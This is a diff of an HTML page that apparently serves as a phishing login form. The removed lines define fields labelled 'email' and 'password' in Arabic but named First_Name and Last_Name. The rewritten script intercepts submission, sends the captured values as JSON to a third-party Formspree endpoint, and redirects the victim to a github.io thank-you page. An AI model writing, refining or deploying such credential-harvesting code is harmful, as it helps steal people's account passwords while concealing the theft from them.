@@ -1,36 +1,29 @@
-<form id="my-form" action="https://formspree.io/f/xgozqzbw" method="POST">
-    <label>البريد الإلكتروني:</label>
-    <input type="text" name="First_Name" required>
-    
-    <label>كلمة السر:</label>
-    <input type="text" name="Last_Name" required>
-
-    <button type="submit" id="submit-btn">تسجيل</button>
-</form>
-
 <script>
     var form = document.getElementById("my-form");
     
-    async function handleSubmit(event) {
-      event.preventDefault(); // يمنع ظهور صفحة Formspree البيضاء
-      var data = new FormData(event.target);
+    form.onsubmit = function(event) {
+      event.preventDefault(); 
       
-      fetch(event.target.action, {
-        method: form.method,
-        body: data,
-        headers: {
-            'Accept': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          // التوجيه الإجباري لصفحة الشكر الخاصة بك
+      var data = new FormData(form);
+      // تحويل البيانات لتنسيق يفهمه السيرفر فوراً
+      var object = {};
+      data.forEach((value, key) => object[key] = value);
+      var json = JSON.stringify(object);
+
+      var xhr = new XMLHttpRequest();
+      xhr.open(form.method, form.action);
+      xhr.setRequestHeader("Content-Type", "application/json"); // إخبار السيرفر أننا نرسل بيانات منظمة
+      xhr.setRequestHeader("Accept", "application/json");
+      
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState !== XMLHttpRequest.DONE) return;
+        if (xhr.status === 200) {
+          // التوجيه لصفحة الشكر بعد التأكد من استلام السيرفر للبيانات
           window.location.href = "https://alymaanythlkm.github.io/999/thanks.html";
         } else {
-          alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
+          alert("خطأ: تأكد من تفعيل النموذج في إيميلك");
         }
-      }).catch(error => {
-        alert("تأكد من اتصالك بالإنترنت.");
-      });
-    }
-    form.addEventListener("submit", handleSubmit)
+      };
+      xhr.send(json);
+    };
 </script>
